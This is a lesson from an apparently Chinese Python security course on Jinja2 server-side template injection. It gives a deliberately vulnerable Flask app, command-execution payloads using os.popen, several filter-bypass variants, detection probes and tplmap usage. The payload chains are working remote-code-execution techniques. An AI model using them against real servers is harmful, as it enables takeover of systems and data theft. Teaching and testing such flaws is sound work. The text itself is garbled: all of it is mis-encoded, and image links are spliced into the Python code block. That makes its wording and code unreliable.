# ğŸ Pythonå®‰å…¨è¯¾ç¨‹ P69ï¼šSSTIæ¨¡æ¿æ³¨å…¥ä¸Jinja2å¼•æ“åˆ©ç”¨ç»•è¿‡

![](img/4f35c1213d1007e26878f35f72713efc_1.png)

![](img/4f35c1213d1007e26878f35f72713efc_3.png)

![](img/4f35c1213d1007e26878f35f72713efc_5.png)

![](img/4f35c1213d1007e26878f35f72713efc_6.png)

## æ¦‚è¿°
åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†å­¦ä¹ Python Webå®‰å…¨ä¸­çš„ä¸€ä¸ªé‡è¦æ¼æ´ï¼šæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ã€‚æˆ‘ä»¬å°†é‡ç‚¹è®²è§£Jinja2æ¨¡æ¿å¼•æ“çš„SSTIæ¼æ´åŸç†ã€åˆ©ç”¨æ–¹æ³•ã€ç»•è¿‡æŠ€å·§ä»¥åŠé»‘ç›’æ£€æµ‹æ‰‹æ®µã€‚è¯¾ç¨‹å†…å®¹ä»åŸºç¡€æ¦‚å¿µåˆ°å®æˆ˜åˆ©ç”¨ï¼Œæ—¨åœ¨è®©åˆå­¦è€…ä¹Ÿèƒ½ç†è§£å¹¶æŒæ¡ç›¸å…³æŠ€æœ¯ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_8.png)

![](img/4f35c1213d1007e26878f35f72713efc_10.png)

![](img/4f35c1213d1007e26878f35f72713efc_12.png)

![](img/4f35c1213d1007e26878f35f72713efc_14.png)

![](img/4f35c1213d1007e26878f35f72713efc_16.png)

![](img/4f35c1213d1007e26878f35f72713efc_18.png)

## ä»€ä¹ˆæ˜¯SSTIï¼ŸğŸ”
SSTIå…¨ç§°ä¸ºServer-Side Template Injectionï¼Œå³æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ã€‚è¿™æ˜¯ä¸€ç§å‘ç”Ÿåœ¨Webåº”ç”¨æ¨¡æ¿æ¸²æŸ“è¿‡ç¨‹ä¸­çš„å®‰å…¨æ¼æ´ã€‚å½“ç”¨æˆ·è¾“å…¥è¢«ç›´æ¥æ‹¼æ¥åˆ°æ¨¡æ¿ä¸­ï¼Œå¹¶ä¸”æœªç»å……åˆ†è¿‡æ»¤å°±äº¤ç»™æ¨¡æ¿å¼•æ“è§£ææ—¶ï¼Œæ”»å‡»è€…å¯èƒ½æ³¨å…¥æ¶æ„æ¨¡æ¿ä»£ç ï¼Œæœ€ç»ˆå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

![](img/4f35c1213d1007e26878f35f72713efc_20.png)

![](img/4f35c1213d1007e26878f35f72713efc_22.png)

![](img/4f35c1213d1007e26878f35f72713efc_24.png)

![](img/4f35c1213d1007e26878f35f72713efc_26.png)

å‰æœŸåœ¨PHPå®‰å…¨å¼€å‘å’ŒJavaå®‰å…¨å¼€å‘è¯¾ç¨‹ä¸­å·²åšè¿‡ç®€å•æ¼”ç¤ºã€‚å®é™…ä¸Šï¼Œå„ç§Webå¼€å‘è¯­è¨€å’Œæ¡†æ¶çš„æ¨¡æ¿å¼•æ“éƒ½å¯èƒ½å­˜åœ¨æ­¤ç±»é—®é¢˜ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_28.png)

![](img/4f35c1213d1007e26878f35f72713efc_30.png)

![](img/4f35c1213d1007e26878f35f72713efc_32.png)

![](img/4f35c1213d1007e26878f35f72713efc_34.png)

![](img/4f35c1213d1007e26878f35f72713efc_36.png)

![](img/4f35c1213d1007e26878f35f72713efc_38.png)

![](img/4f35c1213d1007e26878f35f72713efc_40.png)

## ä¸»æµæ¨¡æ¿å¼•æ“ä¸æ¼æ´
ä»¥ä¸‹æ˜¯ä¸€äº›å‡ºç°è¿‡å®‰å…¨é—®é¢˜çš„å¸¸è§æ¨¡æ¿å¼•æ“ï¼š

![](img/4f35c1213d1007e26878f35f72713efc_42.png)

![](img/4f35c1213d1007e26878f35f72713efc_44.png)

![](img/4f35c1213d1007e26878f35f72713efc_46.png)

![](img/4f35c1213d1007e26878f35f72713efc_48.png)

![](img/4f35c1213d1007e26878f35f72713efc_50.png)

![](img/4f35c1213d1007e26878f35f72713efc_52.png)

*   **Python**: Jinja2, Mako, Tornado
*   **PHP**: Smarty, Twig
*   **Java**: FreeMarker, Velocity, Thymeleaf
*   **JavaScript**: Jade, Handlebars, EJS
*   **Ruby**: ERB, Slim, Haml

![](img/4f35c1213d1007e26878f35f72713efc_54.png)

![](img/4f35c1213d1007e26878f35f72713efc_56.png)

![](img/4f35c1213d1007e26878f35f72713efc_58.png)

![](img/4f35c1213d1007e26878f35f72713efc_59.png)

![](img/4f35c1213d1007e26878f35f72713efc_61.png)

![](img/4f35c1213d1007e26878f35f72713efc_63.png)

æ¼æ´äº§ç”Ÿçš„æ ¹æœ¬åŸå› é€šå¸¸å¹¶éå¼•æ“æœ¬èº«çš„è®¾è®¡ç¼ºé™·ï¼Œè€Œæ˜¯å¼€å‘äººå‘˜åœ¨ä½¿ç”¨æ—¶æœªèƒ½å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå®‰å…¨å¤„ç†ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_65.png)

![](img/4f35c1213d1007e26878f35f72713efc_67.png)

![](img/4f35c1213d1007e26878f35f72713efc_69.png)

![](img/4f35c1213d1007e26878f35f72713efc_71.png)

![](img/4f35c1213d1007e26878f35f72713efc_73.png)

![](img/4f35c1213d1007e26878f35f72713efc_75.png)

## SSTIæ¼æ´åŸç†ä¸æ¼”ç¤º ğŸ’¥
ä¸ºäº†æ›´ç›´è§‚åœ°å±•ç¤ºæ¼æ´ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä½¿ç”¨Flaskæ¡†æ¶ï¼ˆé›†æˆJinja2æ¨¡æ¿å¼•æ“ï¼‰çš„Python Webåº”ç”¨ç¤ºä¾‹ä»£ç ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_77.png)

![](img/4f35c1213d1007e26878f35f72713efc_79.png)

![](img/4f35c1213d1007e26878f35f72713efc_81.png)

![](img/4f35c1213d1007e26878f35f72713efc_83.png)

![](img/4f35c1213d1007e26878f35f72713efc_85.png)

### æ¼æ´ä»£ç ç¤ºä¾‹
```python
from flask import Flask, request, render_template_string
app = Flask(__name__)

![](img/4f35c1213d1007e26878f35f72713efc_87.png)

![](img/4f35c1213d1007e26878f35f72713efc_89.png)

![](img/4f35c1213d1007e26878f35f72713efc_91.png)

![](img/4f35c1213d1007e26878f35f72713efc_93.png)

![](img/4f35c1213d1007e26878f35f72713efc_95.png)

@app.route('/')
def index():
    name = request.args.get('name', 'å°è¿ª')
    template = '<h1>Hello {{ s }}!</h1>'
    return render_template_string(template, s=name)

![](img/4f35c1213d1007e26878f35f72713efc_97.png)

![](img/4f35c1213d1007e26878f35f72713efc_99.png)

![](img/4f35c1213d1007e26878f35f72713efc_101.png)

![](img/4f35c1213d1007e26878f35f72713efc_103.png)

![](img/4f35c1213d1007e26878f35f72713efc_105.png)

![](img/4f35c1213d1007e26878f35f72713efc_107.png)

![](img/4f35c1213d1007e26878f35f72713efc_108.png)

![](img/4f35c1213d1007e26878f35f72713efc_110.png)

![](img/4f35c1213d1007e26878f35f72713efc_112.png)

if __name__ == '__main__':
    app.run()
```
è¿™æ®µä»£ç å¯åŠ¨ä¸€ä¸ªWebæœåŠ¡ã€‚å®ƒæ¥æ”¶ä¸€ä¸ªåä¸º`name`çš„GETå‚æ•°ï¼Œé»˜è®¤å€¼ä¸ºâ€œå°è¿ªâ€ï¼Œç„¶åå°†å…¶æ¸²æŸ“åˆ°ä¸€ä¸ªç®€å•çš„HTMLæ¨¡æ¿ä¸­å¹¶è¿”å›ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_114.png)

![](img/4f35c1213d1007e26878f35f72713efc_116.png)

![](img/4f35c1213d1007e26878f35f72713efc_118.png)

![](img/4f35c1213d1007e26878f35f72713efc_120.png)

![](img/4f35c1213d1007e26878f35f72713efc_122.png)

### æ¼æ´è§¦å‘ç‚¹
è®¿é—® `http://127.0.0.1:5000/?name=123`ï¼Œé¡µé¢ä¼šæ˜¾ç¤º `Hello 123!`ã€‚è¿™é‡Œçš„ `{{ s }}` å°±æ˜¯Jinja2çš„æ¨¡æ¿å˜é‡è¯­æ³•ï¼Œ`s`çš„å€¼ç”±æˆ‘ä»¬ä¼ å…¥çš„`name`å‚æ•°æ§åˆ¶ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_124.png)

![](img/4f35c1213d1007e26878f35f72713efc_126.png)

![](img/4f35c1213d1007e26878f35f72713efc_128.png)

![](img/4f35c1213d1007e26878f35f72713efc_130.png)

![](img/4f35c1213d1007e26878f35f72713efc_132.png)

![](img/4f35c1213d1007e26878f35f72713efc_134.png)

![](img/4f35c1213d1007e26878f35f72713efc_136.png)

å…³é”®åœ¨äºï¼ŒJinja2å¼•æ“ä¼šè§£æ `{{ ... }}` ä¸­çš„å†…å®¹ã€‚å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„ä¸æ˜¯æ™®é€šå­—ç¬¦ä¸²ï¼Œè€Œæ˜¯æ¨¡æ¿è¡¨è¾¾å¼å‘¢ï¼Ÿ

![](img/4f35c1213d1007e26878f35f72713efc_138.png)

![](img/4f35c1213d1007e26878f35f72713efc_140.png)

![](img/4f35c1213d1007e26878f35f72713efc_142.png)

![](img/4f35c1213d1007e26878f35f72713efc_144.png)

![](img/4f35c1213d1007e26878f35f72713efc_146.png)

![](img/4f35c1213d1007e26878f35f72713efc_148.png)

![](img/4f35c1213d1007e26878f35f72713efc_150.png)

![](img/4f35c1213d1007e26878f35f72713efc_152.png)

### ä»è¡¨è¾¾å¼åˆ°ä»£ç æ‰§è¡Œ
1.  **æµ‹è¯•è¡¨è¾¾å¼æ‰§è¡Œ**ï¼šä¼ å…¥ `name={{2*3}}`ã€‚é¡µé¢æ˜¾ç¤º `Hello 6!`ï¼Œè€Œä¸æ˜¯ `Hello {{2*3}}!`ã€‚è¿™è¯æ˜ `{{2*3}}` è¢«Jinja2å¼•æ“è§£æå¹¶è®¡ç®—äº†ã€‚
2.  **ç†è§£è§£æç¬¦å·**ï¼š`{{` å’Œ `}}` æ˜¯Jinja2çš„æ¨¡æ¿è¡¨è¾¾å¼å®šç•Œç¬¦ã€‚ä¸åŒæ¨¡æ¿å¼•æ“çš„å®šç•Œç¬¦ä¸åŒï¼Œä¾‹å¦‚Smartyæ˜¯ `{...}`ï¼ŒTwigæ˜¯ `{{...}}`ã€‚åˆ©ç”¨æ¼æ´æ—¶ï¼Œéœ€è¦æ ¹æ®ç›®æ ‡ä½¿ç”¨çš„å¼•æ“æ¥è°ƒæ•´payloadçš„æ ¼å¼ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_154.png)

![](img/4f35c1213d1007e26878f35f72713efc_156.png)

![](img/4f35c1213d1007e26878f35f72713efc_158.png)

![](img/4f35c1213d1007e26878f35f72713efc_160.png)

![](img/4f35c1213d1007e26878f35f72713efc_162.png)

è¿™ä¸ªç®€å•çš„è¡¨è¾¾å¼æ‰§è¡Œï¼Œä¸ºåç»­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ‰“å¼€äº†å¤§é—¨ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_164.png)

![](img/4f35c1213d1007e26878f35f72713efc_166.png)

![](img/4f35c1213d1007e26878f35f72713efc_168.png)

![](img/4f35c1213d1007e26878f35f72713efc_170.png)

## Jinja2 SSTIæ¼æ´åˆ©ç”¨è¯¦è§£ âš™ï¸
åœ¨Pythonçš„Jinja2 SSTIä¸­ï¼Œåˆ©ç”¨è¿‡ç¨‹é€šå¸¸åˆ†ä¸ºä¸‰æ­¥ï¼š**æ¢æµ‹å¯ç”¨ç±»** -> **å¯»æ‰¾ç›®æ ‡ç±»ç´¢å¼•** -> **è°ƒç”¨ç±»æ–¹æ³•æ‰§è¡Œå‘½ä»¤**ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_172.png)

![](img/4f35c1213d1007e26878f35f72713efc_174.png)

![](img/4f35c1213d1007e26878f35f72713efc_176.png)

![](img/4f35c1213d1007e26878f35f72713efc_178.png)

### ç¬¬ä¸€æ­¥ï¼šæ¢æµ‹å¯ç”¨ç±»
åœ¨Jinja2æ¨¡æ¿ä¸­ï¼Œå¯ä»¥ä½¿ç”¨Pythonçš„é­”æœ¯æ–¹æ³•æ¥è·å–ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œ`{{ ''.__class__ }}` ä¼šè¿”å›ç©ºå­—ç¬¦ä¸²çš„ç±»å¯¹è±¡ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_180.png)

![](img/4f35c1213d1007e26878f35f72713efc_182.png)

![](img/4f35c1213d1007e26878f35f72713efc_184.png)

![](img/4f35c1213d1007e26878f35f72713efc_186.png)

ä¸ºäº†è·å–å½“å‰ç¯å¢ƒä¸­æ‰€æœ‰å¯ç”¨çš„ç±»ï¼ˆå³å¯¹è±¡ç»§æ‰¿é“¾ä¸Šçš„æ‰€æœ‰çˆ¶ç±»ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹payloadï¼š
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
*   `__class__`ï¼šè·å–å¯¹è±¡çš„ç±»ã€‚
*   `__mro__`ï¼šè·å–ç±»çš„æ–¹**æ³•è§£æé¡ºåº**ï¼ˆMethod Resolution Orderï¼‰ï¼Œè¿”å›ä¸€ä¸ªåŒ…å«è¯¥ç±»åŠå…¶æ‰€æœ‰çˆ¶ç±»çš„å…ƒç»„ã€‚`[1]`é€šå¸¸æŒ‡å‘`object`åŸºç±»ã€‚
*   `__subclasses__()`ï¼šè·å–`object`åŸºç±»çš„æ‰€æœ‰ç›´æ¥å­ç±»åˆ—è¡¨ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_188.png)

![](img/4f35c1213d1007e26878f35f72713efc_190.png)

![](img/4f35c1213d1007e26878f35f72713efc_192.png)

![](img/4f35c1213d1007e26878f35f72713efc_194.png)

![](img/4f35c1213d1007e26878f35f72713efc_196.png)

![](img/4f35c1213d1007e26878f35f72713efc_198.png)

![](img/4f35c1213d1007e26878f35f72713efc_200.png)

![](img/4f35c1213d1007e26878f35f72713efc_202.png)

![](img/4f35c1213d1007e26878f35f72713efc_204.png)

æ‰§è¡Œè¿™ä¸ªpayloadä¼šè¾“å‡ºä¸€ä¸ªå¾ˆé•¿çš„åˆ—è¡¨ï¼ŒåŒ…å«äº†å½“å‰Pythonç¯å¢ƒä¸­åŠ è½½çš„æ‰€æœ‰ç±»ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_206.png)

![](img/4f35c1213d1007e26878f35f72713efc_208.png)

![](img/4f35c1213d1007e26878f35f72713efc_210.png)

![](img/4f35c1213d1007e26878f35f72713efc_212.png)

### ç¬¬äºŒæ­¥ï¼šå¯»æ‰¾ç›®æ ‡ç±»ç´¢å¼•
æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ‰¾åˆ°å¹¶è°ƒç”¨èƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç±»ï¼Œä¾‹å¦‚ `os` æ¨¡å—æˆ– `subprocess` æ¨¡å—ã€‚æˆ‘ä»¬éœ€è¦åœ¨ä¸Šä¸€æ­¥å¾—åˆ°çš„ç±»åˆ—è¡¨ä¸­ï¼Œæ‰¾åˆ°è¿™äº›ç±»çš„ç´¢å¼•ä½ç½®ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_214.png)

![](img/4f35c1213d1007e26878f35f72713efc_216.png)

![](img/4f35c1213d1007e26878f35f72713efc_218.png)

![](img/4f35c1213d1007e26878f35f72713efc_220.png)

![](img/4f35c1213d1007e26878f35f72713efc_222.png)

![](img/4f35c1213d1007e26878f35f72713efc_224.png)

å‡è®¾æˆ‘ä»¬ä»è¾“å‡ºä¸­æœç´¢ `os`ï¼Œå‘ç° `<class 'os._wrap_close'>` ä½äºåˆ—è¡¨çš„ç¬¬133å·ä½ç½®ï¼ˆç´¢å¼•ä»0å¼€å§‹ï¼Œæ‰€ä»¥æ˜¯ `[133]`ï¼‰ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_226.png)

![](img/4f35c1213d1007e26878f35f72713efc_228.png)

![](img/4f35c1213d1007e26878f35f72713efc_230.png)

![](img/4f35c1213d1007e26878f35f72713efc_232.png)

### ç¬¬ä¸‰æ­¥ï¼šæ„é€ åˆ©ç”¨é“¾æ‰§è¡Œå‘½ä»¤
æ‰¾åˆ°ç›®æ ‡ç±»åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç´¢å¼•è°ƒç”¨å®ƒï¼Œè¿›è€Œè°ƒç”¨å…¶å±é™©æ–¹æ³•ï¼ˆå¦‚ `os.system` æˆ– `os.popen`ï¼‰ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_234.png)

![](img/4f35c1213d1007e26878f35f72713efc_236.png)

![](img/4f35c1213d1007e26878f35f72713efc_238.png)

![](img/4f35c1213d1007e26878f35f72713efc_240.png)

![](img/4f35c1213d1007e26878f35f72713efc_242.png)

![](img/4f35c1213d1007e26878f35f72713efc_244.png)

![](img/4f35c1213d1007e26878f35f72713efc_246.png)

![](img/4f35c1213d1007e26878f35f72713efc_248.png)

ä¸€ä¸ªå…¸å‹çš„å‘½ä»¤æ‰§è¡Œpayloadå¦‚ä¸‹ï¼š
```python
{{ ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['popen']('whoami').read() }}
```
è¿™ä¸ªpayloadçš„åˆ†è§£ï¼š
1.  `''.__class__.__mro__[1].__subclasses__()[133]`ï¼šå®šä½åˆ° `os._wrap_close` ç±»ã€‚
2.  `.__init__.__globals__`ï¼šè·å–è¯¥ç±»åˆå§‹åŒ–å‡½æ•°çš„å…¨å±€å‘½åç©ºé—´ï¼Œå…¶ä¸­å°±åŒ…å«äº†å¯¼å…¥çš„ `os` æ¨¡å—ã€‚
3.  `['popen']`ï¼šä»å…¨å±€å‘½åç©ºé—´ä¸­è·å– `os.popen` å‡½æ•°ã€‚
4.  `('whoami')`ï¼šè°ƒç”¨ `popen` æ‰§è¡Œ `whoami` å‘½ä»¤ã€‚
5.  `.read()`ï¼šè¯»å–å‘½ä»¤æ‰§è¡Œçš„ç»“æœå¹¶è¾“å‡ºåˆ°é¡µé¢ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_250.png)

![](img/4f35c1213d1007e26878f35f72713efc_252.png)

![](img/4f35c1213d1007e26878f35f72713efc_254.png)

![](img/4f35c1213d1007e26878f35f72713efc_256.png)

![](img/4f35c1213d1007e26878f35f72713efc_258.png)

**ä¸ºä»€ä¹ˆç”¨ `popen` è€Œä¸ç”¨ `system`ï¼Ÿ** å› ä¸º `popen` å¯ä»¥æ–¹ä¾¿åœ°è·å–å‘½ä»¤è¾“å‡ºï¼ˆé€šè¿‡ `.read()`ï¼‰ï¼Œè€Œ `system` åªæ‰§è¡Œå‘½ä»¤ï¼Œä¸ç›´æ¥è¿”å›è¾“å‡ºã€‚

![](img/4f35c1213d1007e26878f35f72713efc_260.png)

![](img/4f35c1213d1007e26878f35f72713efc_262.png)

![](img/4f35c1213d1007e26878f35f72713efc_264.png)

![](img/4f35c1213d1007e26878f35f72713efc_266.png)

![](img/4f35c1213d1007e26878f35f72713efc_268.png)

![](img/4f35c1213d1007e26878f35f72713efc_270.png)

## åˆ©ç”¨æŠ€å·§ä¸ç»•è¿‡ ğŸ›¡ï¸ -> âš”ï¸
åœ¨å®é™…æ¼æ´åˆ©ç”¨æˆ–CTFæŒ‘æˆ˜ä¸­ï¼Œç»å¸¸ä¼šé‡åˆ°è¿‡æ»¤å’Œé™åˆ¶ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ç»•è¿‡æŠ€å·§ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_272.png)

![](img/4f35c1213d1007e26878f35f72713efc_274.png)

![](img/4f35c1213d1007e26878f35f72713efc_276.png)

![](img/4f35c1213d1007e26878f35f72713efc_278.png)

![](img/4f35c1213d1007e26878f35f72713efc_280.png)

![](img/4f35c1213d1007e26878f35f72713efc_282.png)

![](img/4f35c1213d1007e26878f35f72713efc_284.png)

![](img/4f35c1213d1007e26878f35f72713efc_286.png)

![](img/4f35c1213d1007e26878f35f72713efc_288.png)

![](img/4f35c1213d1007e26878f35f72713efc_290.png)

### 1. ä½¿ç”¨å…¶ä»–å†…ç½®å¯¹è±¡æˆ–å±æ€§
é™¤äº†ä½¿ç”¨ç©ºå­—ç¬¦ä¸² `''`ï¼Œè¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–å†…ç½®å¯¹è±¡æ¥å¯åŠ¨åˆ©ç”¨é“¾ï¼Œä¾‹å¦‚ç©ºåˆ—è¡¨ `[]`ï¼š
```python
{{ [].__class__.__base__.__subclasses__()[133].__init__.__globals__['popen']('id').read() }}
```
`__base__` ä¸ `__mro__[1]` ä½œç”¨ç±»ä¼¼ï¼Œéƒ½æ˜¯è·å–ç›´æ¥çˆ¶ç±»ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_291.png)

![](img/4f35c1213d1007e26878f35f72713efc_292.png)

![](img/4f35c1213d1007e26878f35f72713efc_294.png)

![](img/4f35c1213d1007e26878f35f72713efc_296.png)

![](img/4f35c1213d1007e26878f35f72713efc_298.png)

### 2. åˆ©ç”¨Flaskå†…ç½®å¯¹è±¡ç»•è¿‡æ•°å­—è¿‡æ»¤
å¦‚æœè¿‡æ»¤äº†æ•°å­—ï¼ˆå¦‚`2`,`3`ï¼Œä½¿æˆ‘ä»¬æ— æ³•æŒ‡å®šç´¢å¼•`133`ï¼‰ï¼Œå¯ä»¥åˆ©ç”¨Flaskæ¡†æ¶çš„ä¸€äº›å†…ç½®å¯¹è±¡ç›´æ¥å¼•ç”¨æ¨¡å—ï¼Œé¿å…ä½¿ç”¨ç´¢å¼•ã€‚
*   **ä½¿ç”¨ `config` å¯¹è±¡**ï¼š
    ```python
    {{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
    ```
    `config` æ˜¯Flaskçš„é…ç½®å¯¹è±¡ï¼Œå…¶å…¨å±€å‘½åç©ºé—´ä¸­ä¹ŸåŒ…å«äº† `os` æ¨¡å—ã€‚
*   **ä½¿ç”¨ `request` å¯¹è±¡**ï¼š
    ```python
    {{ request.application.__init__.__globals__['os'].popen('id').read() }}
    ```

![](img/4f35c1213d1007e26878f35f72713efc_300.png)

![](img/4f35c1213d1007e26878f35f72713efc_302.png)

![](img/4f35c1213d1007e26878f35f72713efc_304.png)

![](img/4f35c1213d1007e26878f35f72713efc_306.png)

![](img/4f35c1213d1007e26878f35f72713efc_308.png)

![](img/4f35c1213d1007e26878f35f72713efc_310.png)

### 3. ç»•è¿‡å¼•å·è¿‡æ»¤
å¦‚æœè¿‡æ»¤äº†å•å¼•å· `'` æˆ–åŒå¼•å· `"`ï¼Œå¯ä»¥ä½¿ç”¨ `request` å¯¹è±¡ä»è¯·æ±‚å‚æ•°ä¸­è·å–å­—ç¬¦ä¸²ã€‚
```python
{{ ().__class__.__base__.__subclasses__()[133].__init__.__globals__[request.args.a].popen(request.args.b).read() }}
```
è®¿é—®URLæ—¶é™„å¸¦å‚æ•°ï¼š`?a=os&b=whoami`

![](img/4f35c1213d1007e26878f35f72713efc_312.png)

![](img/4f35c1213d1007e26878f35f72713efc_313.png)

![](img/4f35c1213d1007e26878f35f72713efc_315.png)

![](img/4f35c1213d1007e26878f35f72713efc_317.png)

### 4. ç»•è¿‡å…³é”®å­—è¿‡æ»¤
å¦‚æœè¿‡æ»¤äº† `os`ã€`popen` ç­‰å…³é”®å­—ï¼Œå¯ä»¥é‡‡ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ã€ç¼–ç æˆ–åˆ©ç”¨å…¶ä»–å‡½æ•°çš„æ–¹å¼ã€‚
*   **å­—ç¬¦ä¸²æ‹¼æ¥**ï¼š`{{ (request.args.a~request.args.b).__... }}`ï¼Œè®¿é—® `?a=o&b=s`
*   **ä½¿ç”¨ `chr()` å‡½æ•°æ„é€ **ï¼š`{{ ().__class__.__base__.__subclasses__()[133].__init__.__globals__[chr(111)%2bchr(115)].popen(...) }}`

![](img/4f35c1213d1007e26878f35f72713efc_319.png)

![](img/4f35c1213d1007e26878f35f72713efc_321.png)

![](img/4f35c1213d1007e26878f35f72713efc_323.png)

![](img/4f35c1213d1007e26878f35f72713efc_325.png)

![](img/4f35c1213d1007e26878f35f72713efc_327.png)

### 5. ä½¿ç”¨ `attr()` è¿‡æ»¤å™¨ç»•è¿‡ç‚¹å·`.`å’Œä¸‹åˆ’çº¿`_`è¿‡æ»¤
Jinja2æä¾›äº† `attr()` è¿‡æ»¤å™¨ï¼Œå¯ä»¥ä»£æ›¿ç‚¹å·æ¥è®¿é—®å±æ€§ã€‚
```python
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(133)|... }}
```
å¦‚æœä¸‹åˆ’çº¿ä¹Ÿè¢«è¿‡æ»¤ï¼ŒåŒæ ·å¯ä»¥é€šè¿‡ `request` å‚æ•°ä¼ é€’å±æ€§åã€‚

![](img/4f35c1213d1007e26878f35f72713efc_329.png)

![](img/4f35c1213d1007e26878f35f72713efc_331.png)

## é»‘ç›’æ£€æµ‹ä¸è‡ªåŠ¨åŒ–å·¥å…· ğŸ§°
åœ¨å®æˆ˜é»‘ç›’æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸æ— æ³•ç›´æ¥çœ‹åˆ°æºä»£ç ã€‚æ£€æµ‹SSTIæ¼æ´å¯ä»¥éµå¾ªä»¥ä¸‹æ€è·¯ï¼š

![](img/4f35c1213d1007e26878f35f72713efc_333.png)

![](img/4f35c1213d1007e26878f35f72713efc_335.png)

![](img/4f35c1213d1007e26878f35f72713efc_337.png)

![](img/4f35c1213d1007e26878f35f72713efc_339.png)

![](img/4f35c1213d1007e26878f35f72713efc_341.png)

### æ£€æµ‹æ€è·¯
1.  **å¯»æ‰¾æ³¨å…¥ç‚¹**ï¼šå…³æ³¨æ‰€æœ‰ç”¨æˆ·è¾“å…¥åœ¨å“åº”é¡µé¢ä¸­**åŸæ ·æ˜¾ç¤º**çš„åœ°æ–¹ã€‚ä¾‹å¦‚ï¼Œç”¨æˆ·åã€æœç´¢å…³é”®è¯ã€é”™è¯¯ä¿¡æ¯ã€è¯­è¨€å‚æ•°ï¼ˆå¦‚`?lang=en`ï¼‰ç­‰ã€‚è¿™ä¸æ£€æµ‹XSSæ¼æ´çš„è§‚å¯Ÿç‚¹ç±»ä¼¼ã€‚
2.  **æ¨¡ç³Šæµ‹è¯•**ï¼šåœ¨ç–‘ä¼¼æ³¨å…¥ç‚¹æäº¤ç‰¹æ®Šçš„æ¨¡æ¿è¯­æ³•æ¢æµ‹payloadï¼Œè§‚å¯Ÿå“åº”æ˜¯å¦è¢«è§£æã€‚
    *   **é€šç”¨æ¢æµ‹**ï¼š`{{7*7}}`ã€`${7*7}`ã€`<%=7*7%>`ï¼ˆå¯¹åº”ä¸åŒå¼•æ“ï¼‰ã€‚
    *   **å¦‚æœå›æ˜¾`49`**ï¼Œåˆ™å¾ˆå¯èƒ½å­˜åœ¨SSTIï¼Œå¹¶å¯ä»¥åˆæ­¥åˆ¤æ–­å¼•æ“ç±»å‹ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_343.png)

![](img/4f35c1213d1007e26878f35f72713efc_345.png)

![](img/4f35c1213d1007e26878f35f72713efc_347.png)

![](img/4f35c1213d1007e26878f35f72713efc_349.png)

![](img/4f35c1213d1007e26878f35f72713efc_351.png)

![](img/4f35c1213d1007e26878f35f72713efc_353.png)

![](img/4f35c1213d1007e26878f35f72713efc_355.png)

![](img/4f35c1213d1007e26878f35f72713efc_357.png)

### è‡ªåŠ¨åŒ–å·¥å…·æ¨è
æ‰‹å·¥æ£€æµ‹å’Œåˆ©ç”¨è¾ƒä¸ºç¹çï¼Œæ¨èä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·è¿›è¡Œåˆæ­¥æ¢æµ‹å’Œåˆ©ç”¨ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_359.png)

![](img/4f35c1213d1007e26878f35f72713efc_361.png)

![](img/4f35c1213d1007e26878f35f72713efc_363.png)

![](img/4f35c1213d1007e26878f35f72713efc_365.png)

![](img/4f35c1213d1007e26878f35f72713efc_367.png)

![](img/4f35c1213d1007e26878f35f72713efc_369.png)

1.  **tplmap** (å·²åœæ­¢ç»´æŠ¤ï¼Œä½†ç»å…¸)
    *   åŠŸèƒ½å…¨é¢ï¼Œæ”¯æŒå¤šç§æ¨¡æ¿å¼•æ“çš„æ£€æµ‹å’Œåˆ©ç”¨ã€‚
    *   ä½¿ç”¨ç¤ºä¾‹ï¼š`python2 tplmap.py -u 'http://target.com/page?name=test'`

![](img/4f35c1213d1007e26878f35f72713efc_371.png)

![](img/4f35c1213d1007e26878f35f72713efc_373.png)

![](img/4f35c1213d1007e26878f35f72713efc_375.png)

![](img/4f35c1213d1007e26878f35f72713efc_377.png)

![](img/4f35c1213d1007e26878f35f72713efc_379.png)

![](img/4f35c1213d1007e26878f35f72713efc_381.png)

![](img/4f35c1213d1007e26878f35f72713efc_383.png)

2.  **SSTImap** (æ¨èï¼ŒæŒç»­æ›´æ–°)
